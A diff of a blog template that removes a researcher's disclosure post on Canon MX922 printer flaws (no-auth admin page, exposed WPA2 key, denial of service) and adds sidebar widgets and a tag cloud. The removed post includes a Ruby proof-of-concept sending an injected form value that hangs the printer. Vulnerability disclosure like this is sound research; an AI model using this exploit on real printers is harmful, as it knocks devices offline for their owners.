@@ -91,178 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
-
-        <div class="entry-content">
-          
-          
-          
-          
 
 
-<figure class="img-responsive">
-    
-        <img src="/img/y-u-no-guy.jpg#left" />
-    
-    
-</figure>
-
-
-<p>I recently bought a new printer at home, so my wife could print coupons without manually attaching to my office printer each time (Thanks coupons.com and all the other shady sites that require spyware-like software to print coupons, and often don&rsquo;t support network printers). I ended up picking up a <a href="https://www.amazon.com/dp/B00AVWKUJS/ref=as_li_ss_til?tag=mattandcom-20&amp;camp=0&amp;creative=0&amp;linkCode=as4&amp;creativeASIN=B00AVWKUJS&amp;adid=07S04SQ3X3C73H5QDS7T&amp;">Canon MX922</a>. It works awesome for her, and is connected over WiFi, so any device in the house can print to it. This got me thinking though, about how secure it was.</p>
-
-<!-- more -->
-
-<h2 id="no-credentials-for-management-interface">No Credentials For Management Interface</h2>
-
-<h3 id="cve-2013-4613">CVE-2013-4613</h3>
-
-<p>I found the IP of the status page of my router, and browsed to it. I was greeted with this management page.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_1.png" />
-    
-    
-</figure>
-
-
-<p>I then figured I&rsquo;d look at some of the more advanced settings, so I clicked the &ldquo;Advanced&rdquo; link. This brought me to a control panel for the printer. I saw a bunch of information, and was surprised that I had not entered <b>any</b> credentials. I figured maybe the status page would be anonymous, but surely I&rsquo;d need some password to access the management pages. But then again, I hadn&rsquo;t used any password when setting up the printer using the LCD.</p>
-
-<h2 id="disclosure-of-wireless-key-and-ssid">Disclosure of Wireless Key and SSID</h2>
-
-<h3 id="cve-2013-4614">CVE-2013-4614</h3>
-
-<p>I eventually browsed to the &ldquo;Network Settings&rdquo; tab, and saw my SSID of &ldquo;Wireless&rdquo;. Not too bad, since it&rsquo;s broadcast in the air.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_2.png" />
-    
-    
-</figure>
-
-
-<p>I saw that it was using WPA2, as I configured. I clicked the &ldquo;Modify&rdquo; button, and saw that I could change all of the wireless settings. The worst was that when I saw the &ldquo;Use WPA2&rdquo; radio button, I saw that there was text in the password box.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_3.png" />
-    
-    
-</figure>
-
-
-<p>Assuming that there was a junk value in there, I viewed the source. Unfortunately, what I found was that the page did indeed have my printer&rsquo;s WPA2 password right there.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_4.png" />
-    
-    
-</figure>
-
-
-<p>I started thinking about this. It wasn&rsquo;t a <i>huge</i> issue, since you&rsquo;d have to already know my WPA2 key to get to the printer, right? Oh, but what about if a device behind my firewall had been compromised by a remote attacker? The attacker would be free to navigate to my printer, and grab my password. If I was like just about every other person I talk to, I probably use the same password on everything, so I don&rsquo;t have to remember unique passwords. That means now an attacker could potentially login to my email, my SSH server, or even other machines on my LAN. This scared me slightly.</p>
-
-<p>After a while, I started thinking that perhaps there were people that could potentially put their printers directly connected to the internet, and have these management interfaces publicly exposed to anonymous clients. I checked out the <a href="http://www.shodanhq.com/search?q=port%3A80+KS_HTTP+1.0">ShodanHQ</a> (FYI, it seems also Minolta uses this server banner as well). I saw that there were nearly 15,000 at the time of this writing, so I wrote up a quick Metasploit module to enumerate the information. It is located <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/canon_wireless.rb">here</a>. Below is sample output from a selection of hosts I got from ShodanHQ and a host that should time out, as a control sample.</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_5.png" />
-    
-    
-</figure>
-
-
-<h2 id="denial-of-service">Denial of Service</h2>
-
-<h3 id="cve-2013-4615">CVE-2013-4615</h3>
-
-<p>I kept playing around with the configuration interface, and while tinkering with some inputs in <a href="http://portswigger.net/burp/">Burp</a>, the device stopped responding. I walked to the other room, where we keep the printer, and noticed that it was completely unresponsive. I had to power-cycle the device, to which it came back up and told me it wasn&rsquo;t powered down properly.</p>
-
-<p>When I reported this to Canon, they asked me for more information, so I provided them the following code as a proof-of-concept.</p>
-
-<pre><code>#!/usr/bin/ruby
-
-require 'net/http'
-require 'uri'
-
-print 'Enter your printer IP Address: '
-input = gets.strip
-
-printer_url = &quot;http://#{input}&quot;
-
-# Make the first request, to set the IP to invalid data
-post = Net::HTTP.post_form(URI.parse(printer_url + '/English/pages_MacUS/cgi_lan.cgi'),
-{'OK.x' =&gt; '61', 'OK.y' =&gt; '12', 'LAN_OPT1' =&gt; '2', 'LAN_TXT1' =&gt; 'Wireless', 'LAN_OPT3' =&gt; '1', 'LAN_TXT21' =&gt; '192', 
-'LAN_TXT22' =&gt; '168', 'LAN_TXT23' =&gt; '1', 'LAN_TXT24' =&gt; '114&quot;&gt;&lt;script&gt;alert(\'xss\');&lt;/script&gt;', 'LAN_TXT31' =&gt; '255',
-'LAN_TXT32' =&gt; '255', 'LAN_TXT33' =&gt; '255', 'LAN_TXT34' =&gt; '0', 'LAN_TXT41' =&gt; '192', 'LAN_TXT42' =&gt; '168', 
-'LAN_TXT43' =&gt; '1', 'LAN_TXT44' =&gt; '1', 'LAN_OPT2' =&gt; '4', 'LAN_OPT4' =&gt; '1', 'LAN_HID1' =&gt; '1'})
-
-# Make the second request, to trigger the DoS
-begin
-get = Net::HTTP.get(URI.parse(printer_url + '/English/pages_MacUS/lan_set_content.html'))
-rescue Timeout::Error
-puts 'Look at your printer to see it is unresponsive.'
-end
-</code></pre>
-
-<p>If you look closely, you can see that I was testing for Cross-Site-Scripting, and put HTML in the &ldquo;LAN_TXT24&rdquo; input box. Canon&rsquo;s javascript validation prevents this, but nothing stops you from manipulating the HTTP response. This is a prime example of why server-side validation is also required.</p>
-
-<p>I ended up turning this into a Metasploit module as well. You can find it available <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/dos/http/canon_wireless_printer.rb">here</a>. It works pretty similarly to most DoS modules:</p>
-
-
-<figure class="img-responsive">
-    
-        <img src="/img/printer_6.png" />
-    
-    
-</figure>
-
-
-<h2 id="canon-s-response">Canon&rsquo;s Response</h2>
-
-<p>I responsibly disclosed these vulnerabilities to Canon, but they apparently don&rsquo;t deem them worthy of being fixed. I don&rsquo;t think they really &ldquo;get it&rdquo;. Since they aren&rsquo;t going to fix it, I am releasing these details publicly. Below is their reply:</p>
-
-<blockquote>
-<p>Dear Mr. Andreko,</p>
-
-<p>Thank you for your patience in allowing Canon to respond.  We have confirmed that the two issues you described in your May 27th e-mail can occur in certain printers such as the MX922.  However, with respect to the issue of no password by default, please note that the inkjet printers which have network functionality such as the MX922 are designed for home use which is supposed to be secured.  For this reason, and for user convenience, the default setting does not require a password.  However, if a user has a particular concern about third parties accessing the user’s home printer, the default setting can be changed to add a password.</p>
-
-<p>Similarly, regarding the DoS issue, Canon believes that its printers will not have to deal with unauthorized access to the network from an external location as long as the printers are used in a secured environment.  The issue you described could only occur when unauthorized access to an unsecured network takes place from the outside.  Canon has long advised customers to ensure that their computers and printers are secured when used in a wireless LAN environment.  We will continue advising customers to use our inkjet printers in a secured network environment with a firewall.  However, even if the printer were not used in a secure environment, in the unlikely chance that this type of access occurred from outside, the printer would simply have to be unplugged and re-plugged to ensure normal operation.  In addition, if the network security settings on the printer had been changed by the external source as a result of the incident, then they would have to be changed back to the default settings along with unplugging and re-plugging the power cord to ensure normal operation.</p>
-
-<p>Again, we thank you for giving Canon the opportunity to investigate these issues and to respond to your concerns.</p>
-
-<p>Best regards,
-Joy
-Executive Response Representative
-Canon Customer Relations
-customer@cits.canon.com
-866-886-1901, x 2130</p>
-</blockquote>
-
-<p>I understand, these vulnerabilites aren&rsquo;t super high priority. They&rsquo;re no ms08-067. But I would still think a vendor would want to fix them. When searching ShodanHQ, I found a bunch of printers from UCLA. I can only imagine the chaos when it becomes finals-week, and all the printers on campus stop working randomly. That&rsquo;d be bad PR for Canon. Who knows what else is out there. I&rsquo;d personally be interested in dumping the firmware of the printer, and seeing if there&rsquo;s a way to get remote code execution out of a crash. I&rsquo;ll chalk that up to my TODO list.</p>
-
-        </div>
-        
-      </article>
+      
+      </div>
     </div>
     
-  </div>
+    <div id='sidebar-wrapper'>
+      <div class='sidebar ready-widget section' id='sidebar'>
+        <div class='widget HTML' data-version='1' id='HTML3'>
+	<h2 class='title'>Author</h2>
+	<div class='widget-content'>
+		<div class="sidebar_about_author">
+			<div class="inner_wrapper">
+				<div class="aboutme-img">
+					<img alt="Author" class="img-responsive" height="388px" src="https://www.mattandreko.com/img/mattandreko_photo.jpg" title="Author (Matt Andreko)" width="300px">
+				</div>
+			</div>
+			<div class="aboutme-info">
+				<h4>Matt Andreko</h4>
+				<p>Security Consultant</p>
+			</div>
+		</div>
+	</div>
+	<div class='clear'></div>
 </div>
+        <div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+	<h2>Popular Articles</h2>
+	<div class='widget-content popular-posts'>
+		<ul>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>
+							<img alt='LOVE WRITING AND SHARING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/love-writing-and-sharing.html'>SOME BLOG POST 1</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>
+							<img alt='THE ULTIMATE CONSUMERS' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/the-ultimate-consumers.html'>SOME BLOG POST 2</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>
+							<img alt='IT IS BEYOND BLOGGING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/it-is-beyond-blogging.html'>SOME BLOG POST 3</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+			<li>
+				<div class='item-thumbnail-only'>
+					<div class='item-thumbnail'>
+						<a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>
+							<img alt='STARBUCKS REPRESENTS SOMETHING' border='0' height='72' src='http://placehold.it/90x65' width='72'/>
+						</a>
+					</div>
+					<div class='item-title'><a href='https://pixel-way2themes.blogspot.in/2015/03/starbucks-represents-something-beyond.html'>SOME BLOG POST 4</a></div>
+				</div>
+				<div style='clear: both;'></div>
+			</li>
+		</ul>
+		<div class='clear'></div>
+	</div>
+</div>
+        <div class='widget HTML' data-version='1' id='HTML2'>
+	<h2 class='title'>Featured</h2>
+	<div class='widget-content'>
+		<span class="labelpost" data-label="Magazine" data-no="4"></span>
+	</div>
+	<div class='clear'></div>
+	<span class='widget-item-control'>
+		<span class='item-control blog-admin'>
+			<a class='quickedit' href='//www.blogger.com/rearrange?blogID=3868080948025121998&widgetType=HTML&widgetId=HTML2&action=editWidget&sectionId=sidebar' onclick='return _WidgetManager._PopupConfig(document.getElementById("HTML2"));' target='configHTML2' title='Edit'>
+				<img alt='' height='18' src='https://resources.blogblog.com/img/icon18_wrench_allbkg.png' width='18'/>
+			</a>
+		</span>
+	</span>
+	<div class='clear'></div>
+</div>
+        <div class='widget Label' data-version='1' id='Label1'>
+	<h2>Categories</h2>
+	<div class='widget-content cloud-label-widget-content'>
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/antivirus'>antivirus</a>
+			</span>
 
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/aslr'>aslr</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/assembly'>assembly</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/brainpan'>brainpan</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/browsers'>browsers</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/burp'>burp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/canon'>canon</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/certification'>certification</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/commandinjection'>commandinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cookies'>cookies</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/csharp'>csharp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ctp'>ctp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/cucumber'>cucumber</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/directorytraversal'>directorytraversal</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dos'>dos</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/dotnet'>dotnet</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/encoding'>encoding</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exif'>exif</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit'>exploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/exploit-exercises'>exploit-exercises</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fail'>fail</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fogbugz'>fogbugz</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/food'>food</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/formatstring'>formatstring</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/fusion'>fusion</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/future'>future</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/gac'>gac</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/getoffmylawn'>getoffmylawn</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/greasemonkey'>greasemonkey</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hacking'>hacking</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/heap'>heap</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hexchat'>hexchat</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/hover'>hover</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/html'>html</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/http'>http</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/includes'>includes</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/injection'>injection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/iphone'>iphone</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/kioptrix'>kioptrix</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/linux'>linux</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/metasploit'>metasploit</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/mips'>mips</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/monxla'>monxla</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/natas'>natas</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/nebula'>nebula</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/net'>net</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/offsec'>offsec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/oscp'>oscp</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/osx'>osx</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/overthewire'>overthewire</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/php'>php</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/printer'>printer</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/projects'>projects</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/protostar'>protostar</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwb'>pwb</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/pwcrack'>pwcrack</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rails'>rails</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rant'>rant</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2libc'>ret2libc</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ret2text'>ret2text</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rop'>rop</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/rspec'>rspec</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/security'>security</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/shellcode'>shellcode</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sprint'>sprint</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sqlinjection'>sqlinjection</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ssh'>ssh</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/suid'>suid</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/sysax'>sysax</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/tdd'>tdd</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/testing'>testing</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/til'>til</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/ui'>ui</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/userscript'>userscript</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/vim'>vim</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/wargames'>wargames</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/windows'>windows</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xor'>xor</a>
+			</span>
+
+		
+			<span class='label-size label-size-5'>
+				<a dir='ltr' href='/tags/xss'>xss</a>
+			</span>
+
+		
+		<div class='clear'></div>
+	</div>
+</div>
+      </div>
+    </div>
+    <div style='clear: both;'></div>
+  </div>
+
+
+
+
+
+		</div>
 		
 		<div id='w2t_footer'>
 			<div class='w2t-copy-container row'>
